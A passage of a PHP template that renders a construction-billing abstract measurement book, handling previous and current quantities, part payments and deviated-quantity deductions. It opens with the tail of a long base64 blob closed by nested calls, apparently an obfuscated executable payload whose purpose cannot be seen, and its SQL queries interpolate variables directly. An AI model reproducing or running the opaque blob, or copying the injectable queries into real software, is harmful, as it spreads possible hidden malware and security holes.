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')))));

	if($Line >= 30)
	{
	?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td><?php //echo $LineTemp; ?></td>
	</tr>
	<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
	</table>
	<p style='page-break-after:always;'></p>
	<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
		<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
	</table>
	<?php echo $table; ?>
	<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
	<?php echo $tablehead; ?>
	<tr>
		<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
		<td></td>
		<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
		<td><?php //echo $LineIncr."*".$Linecheck; ?></td>
	</tr>
	<?php
	$Line = $LineIncr+$Linecheck; $page++;
	}
	//--*************THIS PART IS FOR " PRINT " Item Name, Description and Check Box  SECTION********************//
	?>
	<input type="hidden" name="hid_item_str" id="hid_item_str<?php echo $subdivid; ?>" value="<?php echo $item_str; ?>" />
	<tr border='1' bgcolor="" class="labelprint">
		<!--<td  align='center' width='' class='labelsmall' style=" border-top-color:#666666; border-bottom-color:#0A9CC5; background-color:#0A9CC5" id="td_popupbutton<?php echo $table_group_row; ?>">
			<input type="checkbox" name="check" id="ch_item<?php //echo $table_group_row; ?>" value="<?php //echo $checkbox_str; ?>"  />
		</td>-->
		<td width="61px" align="center" style="border-top-color:#666666;" class="">
			<?php echo $subdivname;?>
		</td>
		<td colspan="8" style="border-top-color:#666666;" class="">
			<?php echo $description; ?>
		</td>
		<td style="border-top-color:#666666;" width="40px"><?php //echo $slm_cnt."**".$dpm_cnt; ?>&nbsp;</td>
		<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
		<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
	</tr>
	<?php 
	$rowcount++; $Line++;//echo "A = ".$Line."<br/>";
	// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page);  $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>"; }
	
	if(in_array($subdivisionlist[$i],$DevItemArray))
	{
		//$slm_measurement_qty = 0;
		//$slm_cnt = 0;
		$DpmAmount_1 = $dpm_measurement_qty * $rate;
		?>
		<tr border='1' bgcolor="#DF00FE" class="labelprint">
				<td  align='left' width='' class=''>&nbsp;</td>
				<td  align='left' width='' class='' style="font-size:10px;"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
				<td  align='right' width='' class=''><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
				<td  align='left' width='' class=''>&nbsp;</td>
				<td  align='left' width='' class=''>&nbsp;</td>
				<td  align='right' width='' class=''>&nbsp;</td>
				<td  align='left' width='' class=''>&nbsp;</td>
				<td  align='right' width='' class=''><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
				<td  align='right' width='' class=''><?php 
								echo number_format($DpmAmount_1, 2, '.', '');
								$dpm_amount_item 		= $dpm_amount_item + $DpmAmount_1;
								?></td>
				<td  align='right' width='' class=''></td>
				<td  align='right' width='' class=''></td>
				<td  align='center' width='' class='' style="font-size:9px;"></td>
			</tr>
			<?php
			$Line++;
	}
	else
	{
	
	
	
	
	
	//--*************THIS PART IS FOR " PRINT " DEDUCT PREVIOUS MEASUREMENT ( D.P.M. ) SECTION*****************//
		$QtyDpmSlm_4 = 0;	$PercDpmSlm_4 = 0;	$Dpm_Slm_Amount_4 = 0;	$total_percent_dpm_slm_4 = 0;
		$QtyDpmSlm_3 = 0;	$PercDpmSlm_3 = 0;	$Dpm_Slm_Amount_3 = 0;	$total_percent_dpm_slm_3 = 0;
		$QtyDpmSlm_2 = 0;	$PercDpmSlm_2 = 0;	$Dpm_Slm_Amount_2 = 0;	$total_percent_dpm_slm_2 = 0;
		$QtyDpmSlm_1 = 0;	$PercDpmSlm_1 = 0;	$Dpm_Slm_Amount_1 = 0;	$total_percent_dpm_slm_1 = 0;
	
		if($dpm_cnt > 0)
		{
			$eplodedpm = explode("*", rtrim($dpm_mesurementbook_details,"*"));
			//echo "D = ".count($eplodedpm)."<br/>";
			 $DpmTemp = 0;
			for($x4=0; $x4<count($eplodedpm); $x4+=13)
			{
				$dpmqty 				= $eplodedpm[$x4+1];
				//echo $dpmqty."<br/>";
				$remarks 				= $eplodedpm[$x4+10];
				$rbnDpm					= $eplodedpm[$x4+11];
				$MeasurementbookidDpm	= $eplodedpm[$x4+12];
				$paymentpercent_dpm 	= $eplodedpm[$x4+7];
				$dpmamt 				= $dpmqty * $rate * $paymentpercent_dpm / 100;
				$dummy=0;
				if(in_array($MeasurementbookidDpm, $DpmArrMbidList)) 
				{
					$ArrUniqueVal 	= array_unique($DpmArrMbidList);
					$UniqueCount 	= count($ArrUniqueVal);
					$x6=0;
					$count_1 		= count($DpmArrAmbList);
					$count_2 		= count($DpmArrAmbPgList);
					$AMBookNo 		= $DpmArrAmbList[$count_1-1];
					$AMBookPage 	= $DpmArrAmbList[$count_2-1];
					while($x6<=$UniqueCount)
					{
						$StartKey = $ArrUniqueVal[$x6];
						$PaidDpmPerc = $DpmArrPercent[$StartKey];
						$rowspancnt = $UniqueCount+$DpmTemp;
						$DpmKeyresult = checkPartpayment($DpmArrMbidList,$StartKey);
						$DpmPercSum = $PaidDpmPerc;
						if($DpmKeyresult != "")
						{
							$explodeDpmKeyresult = explode("*",$DpmKeyresult);
							for($x7=0; $x7<count($explodeDpmKeyresult); $x7++)
							{
								$key = $explodeDpmKeyresult[$x7];
								$DpmPercSum = $DpmPercSum + $DpmArrPayPercentList[$key];
							}
							if(($x6 == 0)&&($DpmTemp == 0))
							{
							$DpmQuantityty_1 = $DpmArrQuantityList[$key];
							$DpmAmount_1 = $DpmQuantityty_1 * $rate * $DpmPercSum /100;
								if(in_array($StartKey, $SlmArrMbidList))
								{
									$Arrkey = array_search($StartKey, $SlmArrMbidList);
									$QtyDpmSlm_1 = $SlmArrQuantityList[$Arrkey];
									$PercDpmSlm_1 = $SlmArrPayPercentList[$Arrkey];
									$Dpm_Slm_Amount_1 = $QtyDpmSlm_1 * $PercDpmSlm_1 * $rate/100;
								}
							$total_percent_dpm_slm_1 = $DpmPercSum+$PercDpmSlm_1;
							
	?>
						<tr border='1' bgcolor="#FFFFFF" class="labelprint">
							<td  align='center' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
							<td  align='left' width='180px' class='' rowspan="<?php echo $rowspancnt; ?>" style="font-size:10px;"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
							<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
							<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
							<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
							<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
							<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"></td>
							<td  align='right' width='' class=''><?php echo $QtyDpmSlm_1; ?></td>
							<td  align='right' width='' class=''>
								<?php 
								echo number_format($DpmAmount_1, 2, '.', '');
								$dpm_amount_item 		= $dpm_amount_item + $DpmAmount_1;
								?>
							</td>
							<td  align='right' width='6%' class='' rowspan=""></td>
							<td  align='right' width='3%' class='' rowspan="">
								<?php
								if(in_array($StartKey, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_1, 2, '.', ''); 
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_1;
								} 
								?>
							</td>
							<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
								<?php 
								if(in_array($StartKey, $SlmArrMbidList))
								{
									echo $total_percent_dpm_slm_1."% Paid"; 
								}
								?>
							</td>
						</tr>
	
	<?php					$rowcount++;	
							}
							
							else
							{
								if(in_array($StartKey, $SlmArrMbidList))
								{
									$Arrkey = array_search($StartKey, $SlmArrMbidList);
									$QtyDpmSlm_2 = $SlmArrQuantityList[$Arrkey];
									$PercDpmSlm_2 = $SlmArrPayPercentList[$Arrkey];
									$Dpm_Slm_Amount_2 = $QtyDpmSlm_2 * $PercDpmSlm_2 * $rate/100;
									$total_percent_dpm_slm_2 = $DpmPercSum+$PercDpmSlm_2;
									
								}
								else
								{
									$QtyDpm_5 = $DpmArrQuantityList[$key];
									$Dpm_Slm_Amount_2 = $QtyDpm_5 * 100 * $rate/100;
								}
	?>
								<tr border='1' bgcolor="#FFFFFF" class="labelprint">
									<td  align='right' width='' class=''><?php echo $DpmArrQuantityList[$key]; ?></td>
									<td  align='right' width='' class=''><?php echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); $dpm_amount_item = $dpm_amount_item + $Dpm_Slm_Amount_2; ?></td>
									<td  align='right' width='' class=''></td>
									<td  align='right' width='' class=''>
										<?php
										if(in_array($StartKey, $SlmArrMbidList))
										{
											echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
											$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_2;
										} 
										?>
									</td>
									<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
										<?php 
										if(in_array($StartKey, $SlmArrMbidList))
										{
											echo $total_percent_dpm_slm_2."% Paid"; 
										}
										?>
									</td>
								</tr>
			<?php				$rowcount++;		
							}
							
						}
						$DpmArrMbidList = removeArray($DpmKeyresult,$DpmArrMbidList);
						$x6++;	
						array_push($temp_array,$StartKey);
					}
					//$Line = $Line + $rowspancnt;//echo "B = ".$rowspancnt."<br/>";
					// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>";}
				}
								//********** THIS PART IS FOR NOW PAYING (SLM) - DEDUCT PREVIOUS MEASUREMENT **********//
				$PercDpmSlm_3 = 0; 	$Dpm_Slm_Amount_4 = 0;		
				if(in_array($MeasurementbookidDpm, $temp_array))
				{
					$dummy = 1;
				}
				else
				{
					if($x4 == 0)
					{ 
						if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
						{
							$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
							$QtyDpmSlm_3 = $SlmArrQuantityList[$Arrkey2];
							$PercDpmSlm_3 = $SlmArrPayPercentList[$Arrkey2];
							$Dpm_Slm_Amount_3 = $QtyDpmSlm_3 * $PercDpmSlm_3 * $rate /100;
						}
						$total_percent_dpm_slm_3 = $paymentpercent_dpm + $PercDpmSlm_3;
	?>
						<tr border='1' bgcolor="#FFFFFF" class="labelprint">
							<!--<td  align='left' width='3%' class=''>&nbsp;</td>-->
							<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $dpm_cnt; ?>"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
							<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
							<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
							<td  align='right' width='' class=''>
								<?php 
									echo number_format($dpmqty, $decimal, '.', ''); 
									
								?>
							</td>
							<td  align='right' width='' class=''>
								<?php 
									echo number_format($dpmamt, 2, '.', ''); 
									$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
								?>
							</td>
							<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>"></td>
							<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>">
								<?php 
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_3, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_3;
								}
								?>
							</td>
							<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
								<?php 
									echo $total_percent_dpm_slm_3."% Paid"; 
								?>
							</td>
						</tr>	
	<?php 			$rowcount++;
					}
					if(($dpm_cnt > 1) && ($x4 != 0))
					{
						if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
						{
							$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
							$QtyDpmSlm_4 = $SlmArrQuantityList[$Arrkey2];
							$PercDpmSlm_4 = $SlmArrPayPercentList[$Arrkey2];
							$Dpm_Slm_Amount_4 = $QtyDpmSlm_4 * $PercDpmSlm_4 * $rate /100;
						}
						$total_percent_dpm_slm_4 = $paymentpercent_dpm + $PercDpmSlm_4;
	?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<td  align='right' width='' class=''><?php echo number_format($dpmqty, $decimal, '.', ''); ?></td>
						<td  align='right' width='' class=''><?php echo number_format($dpmamt, 2, '.', ''); $dpm_amount_item  = $dpm_amount_item + $dpmamt; ?></td>
						<?php 
						if($dummy == 0) 
						{
						?>
							<td  align='right' width='' class=''></td>
							<td  align='right' width='' class=''>
								<?php 
									if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
									{
										echo number_format($Dpm_Slm_Amount_4, 2, '.', '');
										$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_4;
									}
								 ?>
							</td>
							<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
								<?php
									//if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
									//{
										echo $total_percent_dpm_slm_4."% Paid";
									//}
								?>
							</td>
						<?php 
						} 
						?>
					</tr>
	<?php	
					$rowcount++;
					}
				}
				//$Line = $Line + $dpm_cnt;//echo "C = ".$dpm_cnt."<br/>";
				// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
				$DpmTemp++; 
			}
			//$rowcount++;
		}
		
		
	}	
		
		
		
		
		
		
		
		
	//*************THIS PART IS FOR " PRINT " ---- SINCE LAST MEASUREMENT ( S.L.M. ) SECTION*******************//
	?>
	<?php
	
	
	
		$slm_dpm_str = $slm_measurement_qty."*".$dpm_measurement_qty;
		$mbooktype_query = "select flag from mbookgenerate WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
		$mbooktype_sql = mysql_query($mbooktype_query);
		if(mysql_num_rows($mbooktype_sql)>0)
		{
			$flagtype = @mysql_result($mbooktype_sql,0,'flag');
			if($flagtype == 1) { $mbookdescription = "/MBook No. "; }
			if($flagtype == 2) { $mbookdescription = "/MBook No. "; }
		}
		else
		{
			$mbooktype_query1 = "select flag from measurementbook WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
			$mbooktype_sql1 = mysql_query($mbooktype_query1);
			$flagtype = @mysql_result($mbooktype_sql1,0,'flag');
			if($flagtype == 1) { $mbookdescription = "/MBook No. "; }
			if($flagtype == 2) { $mbookdescription = "/MBook No. "; }
		}
	
		if($slm_cnt > 0)
		{
			$eplodeslm = explode("*", rtrim($slm_mesurementbook_details,"*"));
			//echo "B = ".count($eplodeslm)."<br/>";
			for($x3=0; $x3<count($eplodeslm); $x3+=12)
			{
				$slmqty = $eplodeslm[$x3+1];
				
				$remarks = $eplodeslm[$x3+10];
				$paymentpercent = $eplodeslm[$x3+7];
				$slmamt = $slmqty * $rate * $paymentpercent / 100;
				$slm_amount_item = $slm_amount_item + $slmamt;
				if($x3 == 0)
				{
	?>
			<tr border='1' bgcolor="#FFFFFF" class="labelprint">
				<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $slm_cnt; ?>"><?php echo "Qty Vide P ".$mbpageno_slm.$mbookdescription.$mbookno_slm; ?></td>
				<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?></td>
				<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='left' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='right' width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
				<td  align='right' width='' class=''>
					<?php 
						echo number_format($slmqty, $decimal, '.', ''); 
					?>
				</td>
				<td  align='right' width='' class=''>
					<?php 
						echo number_format($slmamt, 2, '.', ''); 
					?>
				</td>
				<td  align='center' width='' class='' style="font-size:9px;">
					<?php 
					if($paymentpercent<100)
					{
						echo $paymentpercent."% Paid";
					} 
					?>
				</td>
			</tr>
	<?php
				}
				if(($slm_cnt > 1) && ($x3 != 0))
				{
				
	?>
			<tr border='1' bgcolor="#FFFFFF" class="labelprint">
				<td  align='right' width='' class=''><?php echo number_format($slmqty, $decimal, '.', ''); ?></td>
				<td  align='right' width='' class=''><?php echo number_format($slmamt, 2, '.', ''); ?></td>
				<td  align='center' width='' class='' style="font-size:9px;"><?php echo $paymentpercent."% Paid"; ?></td>
			</tr>
	<?php
				$rowcount++;
				}
			}
		$rowcount++; //$Line = $Line + $slm_cnt;//echo "C = ".$slm_cnt."<br/>";
		 //if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
		}
		if($PartPayremarks != "")
		{
	?>
			<tr border='1' class="labelprint" style="font-size:10px;">
				<td colspan="12" align="left" bgcolor="">Remarks &nbsp; :&nbsp;&nbsp;&nbsp;  <?php echo $PartPayremarks; ?></td>
			</tr>
	<?php	
			$rowcount++; $Line++;//echo "E = ".$Line."<br/>";
			// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++;  echo $slm_amount_item."<br/>";}
		}	
	//*************THIS PART IS FOR " PRINT " ---- TOTAL PART ( S.L.M. + D.P.M ) SECTION*******************//	
	$total_qty_item = $dpm_measurement_qty + $slm_measurement_qty;
	$total_amt_item = $slm_amount_item + $dpm_amount_item;
	
		if(in_array($subdivisionlist[$i],$DevItemArray))
		{
			//testing
		}
		else
		{
			$dev_qty_exceed = 0; 
			$CheckDevRes = CheckDeviatedQtyItem($abstsheetid,$subdivid,$total_qty_item);
			if($CheckDevRes != "")
			{
				$DevQtyflag = "";
				$expCheckDevRes = explode("*",$CheckDevRes);
				$wo_qty_with_dev 	= $expCheckDevRes[0];
				$dev_qty_exceed 	= $expCheckDevRes[1];
				$DevQtyflag 		= $expCheckDevRes[2];
				if($DevQtyflag == 1)
				{
					array_push($DevItemArray,$subdivid);
					$WoQtyItemArr[$subdivid] = $wo_qty_with_dev;
					
					
					if($DevPartPayStr != "")
					{
						$deviated_amt_tot_temp = 0;
						$dev_qty_exceed_temp = $dev_qty_exceed;
						$DevPartPayStr 		= rtrim($DevPartPayStr,"@");
						$expDevPartPayStr 	= explode("@",$DevPartPayStr);
						for($s2=0; $s2<count($expDevPartPayStr); $s2++)
						{
							$DevPartPayStr2 	= $expDevPartPayStr[$s2];
							$expDevPartPayStr2 	= explode("*",$DevPartPayStr2);
							$Ded_Dev_itemid 	= $expDevPartPayStr2[0];
							$Ded_Dev_qty 		= $expDevPartPayStr2[1];
							$Ded_Dev_percent 	= $expDevPartPayStr2[2];
							if($dev_qty_exceed_temp>0)
							{
								$deviated_amt_temp = round(($Ded_Dev_qty*$rate*$Ded_Dev_percent/100),2);
								$dev_qty_exceed_temp = $dev_qty_exceed_temp - $Ded_Dev_qty;
								$deviated_amt_tot_temp = $deviated_amt_tot_temp + $deviated_amt_temp;
							}
							//else
							//{
								//$deviated_amt_temp = round(($Ded_Dev_qty*$rate),2);
								//$deviated_amt_tot_temp = $deviated_amt_tot_temp + $deviated_amt_temp;
							//}
						}
					}
					//$deviated_amt = round(($dev_qty_exceed*$rate),2);
					$deviated_amt = round(($deviated_amt_tot_temp),2);
					
		?>
				<tr border='1' class="labelprint" bgcolor="#B3E4FF">
					<td  align='right' width='' class='labelbold' colspan="2">Deduct Deviated Qty.<?php //echo $deviated_amt_tot_temp; ?></td>
					<td  align='right' width='' class=''>-<?php echo number_format($dev_qty_exceed, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php //echo $rate; ?></td>
					<td  align='left' width='' class=''><?php //echo $unit; ?></td>
					<td  align='right' width='' class=''><?php //echo number_format($deviated_amt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''>-<?php echo number_format($dev_qty_exceed, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''>-<?php echo number_format($deviated_amt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''>&nbsp;</td>
				</tr>
				<?php
					$Line++;
					$DedResDpmQty = $dpm_measurement_qty;
					$DedResDpmAmt = $dpm_amount_item;
					$DedResSlmQty = round(($slm_measurement_qty-$dev_qty_exceed),$decimal);
					$DedResSlmAmt = round(($slm_amount_item-$deviated_amt),2);
					$DedResSlmDpmQty = round(($total_qty_item-$dev_qty_exceed),$decimal);
					$DedResSlmDpmAmt = round(($DedResDpmAmt+$DedResSlmAmt),2);
				?>
				<!--<tr border='1' class="labelprint" bgcolor="#B3E4FF">
					<td  align='right' width='' class='labelbold' colspan="2">Deduct - Result</td>
					<td  align='right' width='' class=''><?php echo number_format($DedResSlmDpmQty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo $rate; ?></td>
					<td  align='left' width='' class=''><?php echo $unit; ?></td>
					<td  align='right' width='' class=''><?php echo number_format($DedResSlmDpmAmt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''>&nbsp;</td>
					<td  align='right' width='' class=''><?php echo number_format($DedResDpmQty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo number_format($DedResDpmAmt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo number_format($DedResSlmQty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''><?php echo number_format($DedResSlmAmt, 2, '.', ''); ?></td>
					<td  align='right' width='' class=''>&nbsp;</td>
				</tr>-->
		<?php	
					$Line++;
					
					$total_qty_item = $DedResSlmDpmQty; $total_amt_item = $DedResSlmDpmAmt; $dpm_measurement_qty = $DedResDpmQty;
					$dpm_amount_item = $DedResDpmAmt; $slm_measurement_qty = $DedResSlmQty; $slm_amount_item = $DedResSlmAmt;
				}
			}
		}
			//$total_qty_item = round(($total_qty_item-$dev_qty_exceed),$decimal);
	?>
